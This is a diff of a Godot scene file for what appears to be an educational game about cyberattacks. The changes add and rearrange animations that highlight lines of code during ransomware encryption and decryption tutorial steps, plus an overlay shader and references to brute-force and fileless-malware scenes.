@@ -1,10 +1,10 @@
-[gd_scene load_steps=45 format=3 uid="uid://c651ldtbfalgc"]
+[gd_scene load_steps=89 format=3 uid="uid://c651ldtbfalgc"]
 
 [ext_resource type="Script" uid="uid://c2ug4fslyhbmy" path="res://Scenes/GUI/Ransomware/clean_ransomware.gd" id="1_7e48o"]
 [ext_resource type="Script" uid="uid://btalbkmaah46c" path="res://Scripts/GUI/desktop.gd" id="1_ootqi"]
 [ext_resource type="PackedScene" uid="uid://cnlake8o686ww" path="res://Scenes/GUI/CleanUI/icon.tscn" id="1_vsxan"]
 [ext_resource type="Script" uid="uid://c336up6annq50" path="res://Scenes/GUI/Ransomware/desktop_default.gd" id="2_4yk5j"]
-[ext_resource type="Script" uid="uid://cpwr37ebspmj0" path="res://addons/RadialMenu/RadialMenu.gd" id="2_ootqi"]
+[ext_resource type="PackedScene" path="res://Scenes/GUI/DesktopGUI/desktop_default.tscn" id="2_ojgsj"]
 [ext_resource type="PackedScene" uid="uid://bcejk3vddejkh" path="res://Scenes/GUI/CleanUI/window.tscn" id="3_7e48o"]
 [ext_resource type="Texture2D" uid="uid://clj3qe45uaet3" path="res://Assets/Illustrator/SQLIcon.png" id="4_gq7c2"]
 [ext_resource type="Script" uid="uid://bqyk03rse0met" path="res://Scripts/GUI/clean_ui_ransomware_decrypt.gd" id="4_pnwk5"]
@@ -12,9 +12,10 @@
 [ext_resource type="Texture2D" uid="uid://b0gtdkbrhcgjr" path="res://Assets/Illustrator/TextIcon.png" id="6_d3ylh"]
 [ext_resource type="Script" uid="uid://dkuqbxnfaoo1b" path="res://Scripts/GUI/clean_ui_ransomware_encrypt.gd" id="6_pnwk5"]
 [ext_resource type="Texture2D" uid="uid://bxsekq15pnni8" path="res://Assets/Illustrator/PythonIcon.png" id="7_8h5wy"]
-[ext_resource type="Texture2D" uid="uid://bjymg66wnrrvo" path="res://icon.svg" id="7_xi5cb"]
 [ext_resource type="Script" uid="uid://3ld1620aeihn" path="res://Scenes/GUI/Ransomware/password_check_component.gd" id="10_xi5cb"]
-[ext_resource type="PackedScene" uid="uid://bd84mf3o5vdh5" path="res://Scenes/GUI/cyberattack_card.tscn" id="12_htfik"]
+[ext_resource type="PackedScene" uid="uid://s7ebjmaahksf" path="res://Scenes/GUI/Bruteforce.tscn" id="14_8imo2"]
+[ext_resource type="Script" uid="uid://bkb8jr7yeiwnk" path="res://Scenes/GUI/Fileless Malware/fileless.gd" id="15_lko46"]
+[ext_resource type="Texture2D" uid="uid://dxi4f6remoigf" path="res://Assets/Illustrator/WindowNinePatch.png" id="16_6er24"]
 
 [sub_resource type="Shader" id="Shader_wwpmy"]
 code = "shader_type canvas_item;
@@ -48,8 +49,8 @@ void fragment() {
 [sub_resource type="ShaderMaterial" id="ShaderMaterial_j4e7k"]
 shader = SubResource("Shader_wwpmy")
 shader_parameter/rect_color = Color(0, 0, 0, 0.505882)
-shader_parameter/hole_position = Vector2(0.135, 0.05)
-shader_parameter/hole_size = Vector2(3.025, 0.385)
+shader_parameter/hole_position = Vector2(0.135, 0.64)
+shader_parameter/hole_size = Vector2(3.025, 1.605)
 
 [sub_resource type="Animation" id="Animation_7e48o"]
 length = 0.001
@@ -92,7 +93,7 @@ tracks/2/keys = {
 tracks/3/type = "value"
 tracks/3/imported = false
 tracks/3/enabled = true
-tracks/3/path = NodePath("../../../Ransomware_decrypt/HSplitContainer/CodeEdit:scroll_vertical")
+tracks/3/path = NodePath(".:scroll_vertical")
 tracks/3/interp = 1
 tracks/3/loop_wrap = true
 tracks/3/keys = {
@@ -112,6 +113,46 @@ tracks/4/keys = {
 "transitions": PackedFloat32Array(1),
 "update": 0,
 "values": [0.0]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("../../../RansomwareDecrypt/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 0.64)]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("../../../RansomwareDecrypt/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.025, 1.605)]
+}
+
+[sub_resource type="Animation" id="Animation_wdywc"]
+resource_name = "RansomwareRun"
+length = 1.5
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Window/MarginContainer/VBoxContainer/ProgressBar:value")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0, 0.55, 0.97, 1.5),
+"transitions": PackedFloat32Array(1, 1, 1, 1),
+"update": 0,
+"values": [0.0, 43.99, 80.6, 100.0]
 }
 
 [sub_resource type="Animation" id="Animation_ycoch"]
@@ -154,6 +195,84 @@ tracks/2/keys = {
 "transitions": PackedFloat32Array(1),
 "update": 0,
 "values": [Vector2(3.025, 0.185)]
+}
+
+[sub_resource type="Animation" id="Animation_atxjj"]
+resource_name = "decrypt_ransomware_step1.2"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath(".:scroll_vertical")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [0.0]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Overlay:material:shader_parameter/hole_position")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 0.245)]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Overlay:material:shader_parameter/hole_size")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.025, 0.18)]
+}
+
+[sub_resource type="Animation" id="Animation_8imo2"]
+resource_name = "decrypt_ransomware_step1.3"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath(".:scroll_vertical")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [0.0]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Overlay:material:shader_parameter/hole_position")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 0.055)]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Overlay:material:shader_parameter/hole_size")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.025, 0.37)]
 }
 
 [sub_resource type="Animation" id="Animation_j3jxu"]
@@ -212,26 +331,26 @@ tracks/0/keys = {
 tracks/1/type = "value"
 tracks/1/imported = false
 tracks/1/enabled = true
-tracks/1/path = NodePath("Overlay:material:shader_parameter/hole_position")
+tracks/1/path = NodePath("../../../RansomwareDecrypt/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
 tracks/1/interp = 1
 tracks/1/loop_wrap = true
 tracks/1/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(0.135, 2.035)]
+"values": [Vector2(0.135, 0.64)]
 }
 tracks/2/type = "value"
 tracks/2/imported = false
 tracks/2/enabled = true
-tracks/2/path = NodePath("Overlay:material:shader_parameter/hole_size")
+tracks/2/path = NodePath("../../../RansomwareDecrypt/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
 tracks/2/interp = 1
 tracks/2/loop_wrap = true
 tracks/2/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(3.025, 0.2)]
+"values": [Vector2(3.025, 1.605)]
 }
 
 [sub_resource type="Animation" id="Animation_xi5cb"]
@@ -297,7 +416,7 @@ tracks/1/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(0.135, 2.85)]
+"values": [Vector2(0.135, 2.855)]
 }
 tracks/2/type = "value"
 tracks/2/imported = false
@@ -309,7 +428,46 @@ tracks/2/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(3.025, 0.37)]
+"values": [Vector2(3.025, 0.195)]
+}
+
+[sub_resource type="Animation" id="Animation_ka4hl"]
+resource_name = "decrypt_ransomware_step5.2"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath(".:scroll_vertical")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [0.0]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Overlay:material:shader_parameter/hole_position")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 3.045)]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Overlay:material:shader_parameter/hole_size")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.025, 0.195)]
 }
 
 [sub_resource type="Animation" id="Animation_a3c81"]
@@ -348,15 +506,15 @@ tracks/2/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(3.025, 1.98)]
+"values": [Vector2(3.025, 0.2)]
 }
 
-[sub_resource type="Animation" id="Animation_8h5wy"]
-resource_name = "decrypt_ransomware_step7"
+[sub_resource type="Animation" id="Animation_6abuf"]
+resource_name = "decrypt_ransomware_step6.2"
 tracks/0/type = "value"
 tracks/0/imported = false
 tracks/0/enabled = true
-tracks/0/path = NodePath("../../../Ransomware_decrypt/HSplitContainer/CodeEdit:scroll_vertical")
+tracks/0/path = NodePath(".:scroll_vertical")
 tracks/0/interp = 1
 tracks/0/loop_wrap = true
 tracks/0/keys = {
@@ -375,7 +533,7 @@ tracks/1/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(0.135, 1.87)]
+"values": [Vector2(0.135, 2.06)]
 }
 tracks/2/type = "value"
 tracks/2/imported = false
@@ -387,7 +545,163 @@ tracks/2/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(3.025, 1.58)]
+"values": [Vector2(3.025, 0.58)]
+}
+
+[sub_resource type="Animation" id="Animation_ktduw"]
+resource_name = "decrypt_ransomware_step6.3"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath(".:scroll_vertical")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [9.0]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Overlay:material:shader_parameter/hole_position")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 2.66)]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Overlay:material:shader_parameter/hole_size")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.025, 0.17)]
+}
+
+[sub_resource type="Animation" id="Animation_ahq18"]
+resource_name = "decrypt_ransomware_step6.4"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath(".:scroll_vertical")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [9.0]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Overlay:material:shader_parameter/hole_position")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 2.845)]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Overlay:material:shader_parameter/hole_size")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.025, 0.395)]
+}
+
+[sub_resource type="Animation" id="Animation_8d7tj"]
+resource_name = "decrypt_ransomware_step6.5"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath(".:scroll_vertical")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [9.0]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Overlay:material:shader_parameter/hole_position")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 3.245)]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Overlay:material:shader_parameter/hole_size")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.025, 0.21)]
+}
+
+[sub_resource type="Animation" id="Animation_8h5wy"]
+resource_name = "decrypt_ransomware_step7"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath(".:scroll_vertical")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [9.0]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Overlay:material:shader_parameter/hole_position")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 3.43)]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Overlay:material:shader_parameter/hole_size")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.025, 0.405)]
 }
 
 [sub_resource type="Animation" id="Animation_d3ylh"]
@@ -415,162 +729,6 @@ tracks/1/keys = {
 "transitions": PackedFloat32Array(1),
 "update": 0,
 "values": [Vector2(0.135, 0.655)]
-}
-tracks/2/type = "value"
-tracks/2/imported = false
-tracks/2/enabled = true
-tracks/2/path = NodePath("Overlay:material:shader_parameter/hole_size")
-tracks/2/interp = 1
-tracks/2/loop_wrap = true
-tracks/2/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 0,
-"values": [Vector2(3.025, 0.18)]
-}
-
-[sub_resource type="Animation" id="Animation_htfik"]
-resource_name = "encrypt_ransomware_step3"
-tracks/0/type = "value"
-tracks/0/imported = false
-tracks/0/enabled = true
-tracks/0/path = NodePath(".:scroll_vertical")
-tracks/0/interp = 1
-tracks/0/loop_wrap = true
-tracks/0/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 0,
-"values": [0.0]
-}
-tracks/1/type = "value"
-tracks/1/imported = false
-tracks/1/enabled = true
-tracks/1/path = NodePath("Overlay:material:shader_parameter/hole_position")
-tracks/1/interp = 1
-tracks/1/loop_wrap = true
-tracks/1/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 0,
-"values": [Vector2(0.135, 2.25)]
-}
-tracks/2/type = "value"
-tracks/2/imported = false
-tracks/2/enabled = true
-tracks/2/path = NodePath("Overlay:material:shader_parameter/hole_size")
-tracks/2/interp = 1
-tracks/2/loop_wrap = true
-tracks/2/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 0,
-"values": [Vector2(3.025, 0.18)]
-}
-
-[sub_resource type="Animation" id="Animation_wuj5n"]
-resource_name = "encrypt_ransomware_step4"
-tracks/0/type = "value"
-tracks/0/imported = false
-tracks/0/enabled = true
-tracks/0/path = NodePath(".:scroll_vertical")
-tracks/0/interp = 1
-tracks/0/loop_wrap = true
-tracks/0/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 0,
-"values": [4.0]
-}
-tracks/1/type = "value"
-tracks/1/imported = false
-tracks/1/enabled = true
-tracks/1/path = NodePath("Overlay:material:shader_parameter/hole_position")
-tracks/1/interp = 1
-tracks/1/loop_wrap = true
-tracks/1/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 0,
-"values": [Vector2(0.135, 2.25)]
-}
-tracks/2/type = "value"
-tracks/2/imported = false
-tracks/2/enabled = true
-tracks/2/path = NodePath("Overlay:material:shader_parameter/hole_size")
-tracks/2/interp = 1
-tracks/2/loop_wrap = true
-tracks/2/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 0,
-"values": [Vector2(3.025, 0.185)]
-}
-
-[sub_resource type="Animation" id="Animation_a4l02"]
-resource_name = "encrypt_ransomware_step5"
-tracks/0/type = "value"
-tracks/0/imported = false
-tracks/0/enabled = true
-tracks/0/path = NodePath("Overlay:material:shader_parameter/hole_position")
-tracks/0/interp = 1
-tracks/0/loop_wrap = true
-tracks/0/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 0,
-"values": [Vector2(0.135, 3.655)]
-}
-tracks/1/type = "value"
-tracks/1/imported = false
-tracks/1/enabled = true
-tracks/1/path = NodePath("Overlay:material:shader_parameter/hole_size")
-tracks/1/interp = 1
-tracks/1/loop_wrap = true
-tracks/1/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 0,
-"values": [Vector2(3.025, 0.17)]
-}
-tracks/2/type = "value"
-tracks/2/imported = false
-tracks/2/enabled = true
-tracks/2/path = NodePath(".:scroll_vertical")
-tracks/2/interp = 1
-tracks/2/loop_wrap = true
-tracks/2/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 0,
-"values": [4.0]
-}
-
-[sub_resource type="Animation" id="Animation_atxjj"]
-resource_name = "decrypt_ransomware_step1.2"
-tracks/0/type = "value"
-tracks/0/imported = false
-tracks/0/enabled = true
-tracks/0/path = NodePath(".:scroll_vertical")
-tracks/0/interp = 1
-tracks/0/loop_wrap = true
-tracks/0/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 0,
-"values": [0.0]
-}
-tracks/1/type = "value"
-tracks/1/imported = false
-tracks/1/enabled = true
-tracks/1/path = NodePath("Overlay:material:shader_parameter/hole_position")
-tracks/1/interp = 1
-tracks/1/loop_wrap = true
-tracks/1/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 0,
-"values": [Vector2(0.135, 0.245)]
 }
 tracks/2/type = "value"
 tracks/2/imported = false
@@ -702,6 +860,45 @@ tracks/2/keys = {
 "values": [Vector2(3.025, 0.385)]
 }
 
+[sub_resource type="Animation" id="Animation_pkhx6"]
+resource_name = "encrypt_ransomware_step2.5"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath(".:scroll_vertical")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [0.0]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Overlay:material:shader_parameter/hole_position")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 1.845)]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Overlay:material:shader_parameter/hole_size")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.025, 0.195)]
+}
+
 [sub_resource type="Animation" id="Animation_3jqaa"]
 resource_name = "encrypt_ransomware_step2.6"
 tracks/0/type = "value"
@@ -741,6 +938,45 @@ tracks/2/keys = {
 "values": [Vector2(3.025, 0.205)]
 }
 
+[sub_resource type="Animation" id="Animation_htfik"]
+resource_name = "encrypt_ransomware_step3"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath(".:scroll_vertical")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [0.0]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Overlay:material:shader_parameter/hole_position")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 2.25)]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Overlay:material:shader_parameter/hole_size")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.025, 0.18)]
+}
+
 [sub_resource type="Animation" id="Animation_03xvr"]
 resource_name = "encrypt_ransomware_step3.2"
 tracks/0/type = "value"
@@ -778,6 +1014,45 @@ tracks/2/keys = {
 "transitions": PackedFloat32Array(1),
 "update": 0,
 "values": [Vector2(3.025, 0.385)]
+}
+
+[sub_resource type="Animation" id="Animation_wuj5n"]
+resource_name = "encrypt_ransomware_step4"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath(".:scroll_vertical")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [4.0]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Overlay:material:shader_parameter/hole_position")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 2.25)]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Overlay:material:shader_parameter/hole_size")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.025, 0.185)]
 }
 
 [sub_resource type="Animation" id="Animation_b0i1v"]
@@ -897,59 +1172,43 @@ tracks/2/keys = {
 "values": [Vector2(3.025, 0.425)]
 }
 
-[sub_resource type="Animation" id="Animation_pkhx6"]
-resource_name = "encrypt_ransomware_step2.5"
+[sub_resource type="Animation" id="Animation_a4l02"]
+resource_name = "encrypt_ransomware_step5"
 tracks/0/type = "value"
 tracks/0/imported = false
 tracks/0/enabled = true
-tracks/0/path = NodePath(".:scroll_vertical")
+tracks/0/path = NodePath("Overlay:material:shader_parameter/hole_position")
 tracks/0/interp = 1
 tracks/0/loop_wrap = true
 tracks/0/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [0.0]
+"values": [Vector2(0.135, 3.655)]
 }
 tracks/1/type = "value"
 tracks/1/imported = false
 tracks/1/enabled = true
-tracks/1/path = NodePath("Overlay:material:shader_parameter/hole_position")
+tracks/1/path = NodePath("Overlay:material:shader_parameter/hole_size")
 tracks/1/interp = 1
 tracks/1/loop_wrap = true
 tracks/1/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(0.135, 1.845)]
+"values": [Vector2(3.025, 0.17)]
 }
 tracks/2/type = "value"
 tracks/2/imported = false
 tracks/2/enabled = true
-tracks/2/path = NodePath("Overlay:material:shader_parameter/hole_size")
+tracks/2/path = NodePath(".:scroll_vertical")
 tracks/2/interp = 1
 tracks/2/loop_wrap = true
 tracks/2/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(3.025, 0.195)]
-}
-
-[sub_resource type="Animation" id="Animation_wdywc"]
-resource_name = "RansomwareRun"
-length = 1.5
-tracks/0/type = "value"
-tracks/0/imported = false
-tracks/0/enabled = true
-tracks/0/path = NodePath("Window/MarginContainer/VBoxContainer/ProgressBar:value")
-tracks/0/interp = 1
-tracks/0/loop_wrap = true
-tracks/0/keys = {
-"times": PackedFloat32Array(0, 0.55, 0.97, 1.5),
-"transitions": PackedFloat32Array(1, 1, 1, 1),
-"update": 0,
-"values": [0.0, 43.99, 80.6, 100.0]
+"values": [4.0]
 }
 
 [sub_resource type="AnimationLibrary" id="AnimationLibrary_4yk5j"]
@@ -959,11 +1218,17 @@ _data = {
 &"Ransomware_password": SubResource("Animation_ycoch"),
 &"decrypt_ransomware_step1": SubResource("Animation_pnwk5"),
 &"decrypt_ransomware_step1.2": SubResource("Animation_atxjj"),
+&"decrypt_ransomware_step1.3": SubResource("Animation_8imo2"),
 &"decrypt_ransomware_step2": SubResource("Animation_j3jxu"),
 &"decrypt_ransomware_step3": SubResource("Animation_4yk5j"),
 &"decrypt_ransomware_step4": SubResource("Animation_xi5cb"),
 &"decrypt_ransomware_step5": SubResource("Animation_gq7c2"),
+&"decrypt_ransomware_step5.2": SubResource("Animation_ka4hl"),
 &"decrypt_ransomware_step6": SubResource("Animation_a3c81"),
+&"decrypt_ransomware_step6.2": SubResource("Animation_6abuf"),
+&"decrypt_ransomware_step6.3": SubResource("Animation_ktduw"),
+&"decrypt_ransomware_step6.4": SubResource("Animation_ahq18"),
+&"decrypt_ransomware_step6.5": SubResource("Animation_8d7tj"),
 &"decrypt_ransomware_step7": SubResource("Animation_8h5wy"),
 &"encrypt_ransomware_step2": SubResource("Animation_d3ylh"),
 &"encrypt_ransomware_step2.2": SubResource("Animation_lko46"),
@@ -988,236 +1253,2165 @@ _data = {
 &"Ransomware_Load_Complete_decryption": SubResource("Animation_dfd0b")
 }
 
-[node name="DesktopTabs" type="TabContainer" node_paths=PackedStringArray("malware_icon", "decr_icon", "key_icon", "decrypted_message")]
+[sub_resource type="Shader" id="Shader_k518g"]
+code = "shader_type canvas_item;
+render_mode blend_mix, unshaded;
+
+// The full color of the rectangle
+uniform vec4 rect_color : source_color = vec4(1.0, 0.2, 0.2, 1.0); // red
+
+// Hole configuration
+uniform vec2 hole_position = vec2(0.0, 0.0); // Top-left corner of the hole (in pixels)
+uniform vec2 hole_size = vec2(50.0, 50.0);   // Width and height of the hole (square or rectangle)
+
+void fragment() {
+    // Convert UV to local pixel coordinates
+    vec2 pixel_pos = UV * vec2(textureSize(TEXTURE, 0));
+
+    // Check if we're inside the hole area
+    bool in_hole = pixel_pos.x > hole_position.x &&
+                   pixel_pos.x < hole_position.x + hole_size.x &&
+                   pixel_pos.y > hole_position.y &&
+                   pixel_pos.y < hole_position.y + hole_size.y;
+
+    if (in_hole) {
+        discard; // Make transparent
+    }
+
+    COLOR = rect_color;
+}
+"
+
